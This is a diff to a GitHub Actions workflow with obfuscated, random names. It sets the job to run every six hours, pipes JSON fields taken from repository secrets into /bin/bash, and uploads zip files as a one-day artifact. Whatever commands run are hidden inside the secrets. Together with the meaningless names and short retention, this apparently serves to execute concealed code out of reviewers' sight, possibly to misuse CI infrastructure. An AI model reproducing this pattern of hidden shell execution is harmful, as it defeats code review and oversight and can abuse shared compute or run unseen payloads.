@@ -1,8 +1,9 @@
 name: jeremybatch335
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '45 3/6 * * *'
+    - cron: '31 0,6,12,18 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,10 +11,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: jeremybatch335
         env:
-          vrch4: ${{ secrets.vrch4 }}
+          c64: ${{ secrets.c64 }}
         run: |
-          echo $vrch4 | jq -r .ug9739 | /bin/bash
-          echo $vli0 | jq -r .owv573 | /bin/bash
-          echo $b9278 | jq -r .bis5595 | /bin/bash
-          echo $een14 | jq -r .rge4 | /bin/bash
+          printf '%s' "$c64" | jq -r .x007 | /bin/bash
+          printf '%s' "$mszqj8404" | jq -r .sk65 | /bin/bash
+          printf '%s' "$pq0240" | jq -r .l0 | /bin/bash
+          echo $ednp91 | jq -r .lkdat9 | /bin/bash
+          echo $grq4013 | jq -r .cvjg727 | /bin/bash
+          printf '%s' "$zwfnp68291" | jq -r .acs6515 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: H7o9MWMl
+          path: "*.zip"
+          retention-days: 1
